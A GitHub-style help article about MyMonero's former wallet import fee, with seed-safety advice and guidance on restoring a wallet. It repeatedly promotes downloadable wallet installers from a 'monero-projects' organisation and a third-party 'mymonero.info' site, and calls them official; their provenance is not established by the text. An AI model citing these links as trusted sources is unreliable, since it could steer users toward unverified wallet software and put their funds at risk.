<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero Import Fee Explained</h1>
<p align="center">What the historical wallet import fee meant, and how to approach a prompt today.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
Historically, MyMonero hosted servers charged a one-time fee to import a wallet created elsewhere. That is historical context, not a statement of any current fee; check the actual wallet and release information you are using before proceeding.


The MyMonero.info site covers this in its [MyMonero import fee guide](https://mymonero.info/mymonero-import-fee). Before installing anything, use the [MyMonero download page](https://mymonero.info/github/monero-projects), and read [MyMonero safety facts](https://mymonero.info/is-mymonero-safe) if anything feels off.

## You'll see this if
- You are restoring an existing wallet and see a fee-related message.
- You heard MyMonero charged for importing a wallet from another application.
- You are unsure whether a prompt is legitimate or a scam.
- You want to restore a seed without giving it to an online service.

## Why it happens
Wallet import and ordinary transaction fees are different concepts. Historically, MyMonero hosted servers charged a one-time fee to import a wallet created elsewhere. Do not assume that historical policy describes a current charge or that a message you encounter today is authentic. MyMonero hosted servers and web wallet login stopped, and the desktop app has a different status: its final release can still open wallets and send XMR, but it is no longer maintained and has no new features or security updates.

MyMonero's final desktop release is v1.3.3, distributed for Windows as .exe, macOS as .dmg, and Linux as .zip on the project's GitHub releases. You may continue using the desktop app or restore your seed in Cake Wallet, the only other wallet named here. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. See [MyMonero migration choices](./mymonero-to-cake-wallet-migration.md) and [restore a MyMonero wallet](./restore-mymonero-wallet.md).

A fee prompt should never be a reason to reveal recovery information. A seed is sensitive whether the prompt appears in an app, email, direct message, or web page. No legitimate helper needs your seed or private keys to explain a fee. Use the genuine software and its stated in-app information, and do not follow unsolicited payment directions.

---
## Fix
1. **Identify where the message appears.** Note whether it is inside the wallet application you intentionally opened or in a browser, email, or chat. A page reached from an unsolicited message is not a trustworthy source for a wallet fee.
2. **Distinguish import from sending.** A historical import fee relates to importing a wallet created elsewhere on MyMonero hosted servers. A transaction fee relates to sending funds. Do not confuse a historic import description with the fee shown when preparing an ordinary transfer.
3. **Check the app context.** MyMonero hosted server and web wallet login stopped. If a supposed MyMonero web service asks you to import or unlock funds, do not enter your seed. The old desktop app's final version is v1.3.3; consult its [GitHub release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) for official release details.
4. **Do not rely on a past price or rumor.** Historical information does not establish a fee today. Review the exact details presented by the genuine wallet you chose and verify through the project's published information. If unclear, pause rather than paying an unknown recipient.
5. **Keep the seed private during restoration.** MyMonero seed formats include 13 words (MyMonero-specific, legacy) and 25 words (standard Monero). Use a compatible restore process in trusted wallet software. Do not enter words in a website, support ticket, or fee calculator.
6. **Consider the available wallet paths.** You can continue using MyMonero desktop, understanding it is no longer maintained, or restore the seed in Cake Wallet. Check Cake Wallet's current restore options within the genuine app. Do not use an unofficial third-party migration service.
7. **Separate wallet restoration from a funds transfer.** Restoring a seed gives access to the wallet; it does not mean you have to send funds. If you decide to send, review the destination, amount, and transaction fee in the wallet. For a transfer to an exchange, use [MyMonero exchange withdrawal guidance](./mymonero-withdraw-to-exchange.md).
8. **Ask questions without sharing secrets.** If you contact a project or wallet support channel, describe the application, version, and wording of the prompt, but omit seed words, private keys, passwords, and sensitive screenshots.

> [!WARNING]
> A request to provide your seed to remove a fee, unlock a wallet, or verify an import is unsafe. Nobody legitimate should ask for your recovery words.

---
## If that did not work
If you cannot determine whether a message is genuine, do not pay or enter sensitive information. Close the page or message and consult the official project release information directly. For the desktop project, use the [MyMonero desktop repository](https://github.com/monero-projects/mymonero-desktop-wallet). Be aware that the app is no longer maintained and the hosted web wallet login has stopped.

If a restore flow rejects your words, first identify whether you have a 13-word MyMonero-specific legacy seed or a 25-word standard Monero seed. Check your own backup privately and follow seed not accepted guidance. Do not share even a partial seed. If your balance seems incorrect after restoration, allow scanning to complete and review restore height.

## Prevention
- Treat historical import-fee statements as historical, not as a current price list.
- Verify application and release provenance before entering a seed or approving a payment.
- Keep a complete offline seed backup and never share it with support or a fee service.
- Distinguish wallet import information from the fee attached to a send transaction.
- Avoid links in unsolicited messages and unofficial pages claiming to restore hosted login.
- Keep non-secret records of your chosen wallet and migration steps for future reference.

## FAQ
<details><summary>Does MyMonero currently charge a wallet import fee?</summary>

The fact documented here is historical: hosted servers charged a one-time fee to import wallets created elsewhere. This does not state a current fee. Check the actual wallet and official project information you use.

</details>

<details><summary>Is an import fee the same as a transaction fee?</summary>

No. The historical import fee concerned wallet import on hosted servers. A transaction fee is associated with sending funds.

</details>

<details><summary>Should I provide my seed to confirm an import charge?</summary>

No. Never share your seed or private keys. Nobody legitimate needs them to explain a fee.

</details>

<details><summary>Can I still use the desktop app?</summary>

The old MyMonero desktop app still opens wallets and sends XMR, but is no longer maintained. Its final release is v1.3.3. You may also consider restoring in Cake Wallet.

</details>

---

## Download MyMonero

- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Receive XMR With a MyMonero Address](./mymonero-receive-xmr-address.md) | Find and share a receiving address safely, and confirm the incoming transaction. |
| [Install MyMonero on Windows](./install-mymonero-windows.md) | Get the final desktop release from the official project page and check the file before opening it. |
| [Install MyMonero on macOS](./install-mymonero-macos.md) | Download the final desktop release from GitHub, verify its SHA-256 value, and open it safely. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
